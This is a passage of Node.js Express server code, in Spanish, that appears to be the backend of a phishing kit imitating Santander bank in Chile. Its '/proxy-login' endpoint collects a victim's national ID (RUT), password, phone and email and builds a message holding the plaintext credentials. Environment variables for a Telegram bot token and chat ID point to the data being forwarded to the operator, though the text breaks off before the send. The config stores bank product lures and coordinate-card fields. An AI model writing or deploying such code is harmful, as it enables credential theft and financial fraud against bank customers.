const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");
const path = require("path");
const fs = require("fs");

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir archivos estáticos desde "public"
app.use(express.static(path.join(__dirname, "public")));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const bloqueados = ["250624344", "25062434-4", "25.062.434-4"];

const CONFIG_FILE = path.join(__dirname, "config.json");
let config = {};
if (fs.existsSync(CONFIG_FILE)) {
  config = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
} else {
  config = {
    producto1: "Línea de Crédito",
    monto1: 5000000,
    producto2: "Tarjeta de Crédito WorldMember Limited Business",
    monto2: 5000000,
    tipoAutorizacion: "santander",
    coord1: "",
    coord2: "",
    coord3: "",
    factibilidad: "off"
  };
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
}

// Endpoint de login
app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, telefono, mail } = req.body;

  if (!telefono && !mail) {
    return res.status(400).send("❌ Debes ingresar teléfono o correo.");
  }

  if (rut && bloqueados.includes(rut)) {
    return res.status(403).send("❌ Tu clave digital ha sido bloqueada.");
  }

  const mensaje = mail
    ? `Nuevo correo recibido: ${mail}`
    : `Nuevo intento de inicio de sesión:\nRUT: ${rut}\nContraseña: ${passwd}\n
